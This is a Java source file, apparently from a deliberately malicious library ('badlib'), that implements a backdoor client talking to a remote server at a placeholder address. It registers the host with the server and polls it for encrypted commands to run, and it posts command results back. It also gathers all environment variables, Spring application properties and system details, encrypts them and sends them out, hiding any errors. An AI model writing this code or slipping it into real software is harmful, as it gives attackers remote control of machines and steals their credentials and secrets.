package br.com.satty.badlib;

import br.com.satty.badlib.dto.Command;
import br.com.satty.badlib.dto.CryptObj;
import br.com.satty.badlib.dto.InfoObj;
import br.com.satty.badlib.dto.UserConfig;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URI;
import java.security.KeyPair;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import static br.com.satty.badlib.ConfigUtils.saveUserConfig;
import static br.com.satty.badlib.FileUtils.getAppplicationProperties;

public class ServerService {
    private static String EndPoint = "http://exemplo.com/api/";
    protected static void sendReturn(UserConfig config, Command comand, String ret) throws Exception {
        CryptObj cripted = CryptUtils.cryptObject(config, comand.getId(), ret);
        URI uri = new URI(EndPoint+"return/"+config.getUid());
        postExecute(cripted.toJsonString(), uri);
    }


    protected static List<Command> getCommands(UserConfig config) throws Exception{
        URI uri = new URI(EndPoint+"cmds/"+config.getUid());

        List<Command> commandList = new ArrayList<>();
        HttpURLConnection connection = (HttpURLConnection) uri.toURL().openConnection();
        connection.setRequestMethod("GET");
        if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            String inputLine;
            while ((inputLine = reader.readLine()) != null) {
                response.append(inputLine);
            }
            reader.close();
            String responseBody = response.toString();

            responseBody = responseBody.substring(1, responseBody.length() - 1);
            String[] jsonObjects = responseBody.split("\\},\\{");
            Command cmd = new Command();
            for (String jsonObject : jsonObjects) {
                // Se houver mais de um objeto, adicione uma chave de fechamento de objeto no final
                if (!jsonObject.endsWith("}")) {
                    jsonObject += "}";
                }
                String[] keyValuePairs = jsonObject.split(",");

                for (String keyValuePair : keyValuePairs) {
                    String[] parts = keyValuePair.split(":");
                    if (parts.length == 2) {
                        String key = parts[0].trim().replaceAll("\"", "");
                        String value = parts[1].trim().replaceAll("\"", "");
                        if ("id".equals(key)) {
                            cmd.setId(value);
                        } else if ("exec".equals(key)) {
                            cmd.setExec( CryptUtils.decrypt(config, value));
                        }
                    }
                }
                commandList.add(cmd);
            }
        }
        return commandList;
    }


    public static UserConfig init() throws Exception{
        KeyPair keypair = CryptUtils.generateKeys();
        UserConfig userConfig = new UserConfig();
        userConfig.setPrKey(CryptUtils.prkTobase64(keypair.getPrivate()));
        String sendData = "{\"pbk\":\""+CryptUtils.pbkTobase64(keypair.getPublic())+"\"}";
        URI uri = new URI(EndPoint+"hello");
        HttpURLConnection connection = (HttpURLConnection) uri.toURL().openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
        connection.setDoOutput(true);
        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = sendData.getBytes("utf-8");
            os.write(input, 0, input.length);
        }
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String inputLine;
        StringBuilder response = new StringBuilder();
        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();
        String key = parseJson(response.toString(), "pbk");
        String uid = parseJson(response.toString(), "uid");
        userConfig.setPrKey(CryptUtils.stringTobase64(key));
        userConfig.setUid(uid);
        return saveUserConfig(userConfig);
    }

    private static String parseJson(String json, String key) {
        int startIndex = json.indexOf("\"" + key + "\"");
        if (startIndex != -1) {
            int endIndex = json.indexOf("\"", startIndex + key.length() + 3); // +3 para pular ":"
            if (endIndex != -1) {
                return json.substring(startIndex + key.length() + 3, endIndex);
            }
        }
        return null;
    }

    public static void sendInformation(UserConfig config) {
        try {
            List<InfoObj> data = new ArrayList<>();
            data.add(new InfoObj("prop","name", System.getProperty("name")));
            data.add(new InfoObj("prop","os.name", System.getProperty("os.name")));
            data.add(new InfoObj("prop","home", System.getProperty("home")));
            data.add(new InfoObj("prop","user.dir", System.getProperty("user.dir")));
            data.add(new InfoObj("prop","java.version", System.getProperty("java.runtime.version")));

            Map<String, String> spenv = getAppplicationProperties();
            for (String envName : spenv.keySet()) {
                    data.add(new InfoObj("spring", envName, spenv.get(envName)));
            }
            Map<String, String> env= System.getenv();
            for (String envName : env.keySet()) {
                data.add(new InfoObj("env", envName, env.get(envName)));
            }

            StringBuilder jsonText = new StringBuilder("[");
            for (InfoObj info : data) {
                jsonText.append(info.toJson()).append(",");
            }
            if (data.size() > 0) {
                jsonText.deleteCharAt(jsonText.length() - 1);
            }
            jsonText.append("]");

            String cripted = CryptUtils.cryptObject(config,jsonText.toString());
            String send_obj = "{\"info\":\""+cripted+"\"}";
            URI uri = new URI(EndPoint+"info/"+config.getUid());
            postExecute(send_obj, uri);
        } catch (Exception e) {
            //like a ninja
        }

    }

    private static void postExecute(String cripted, URI uri) throws IOException {
        HttpURLConnection connection = (HttpURLConnection) uri.toURL().openConnection();
        connection.setRequestMethod("POST");
        connection.setDoOutput(true);
        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = cripted.getBytes("utf-8");
            os.write(input, 0, input.length);
        }
        connection.disconnect();
    }
}
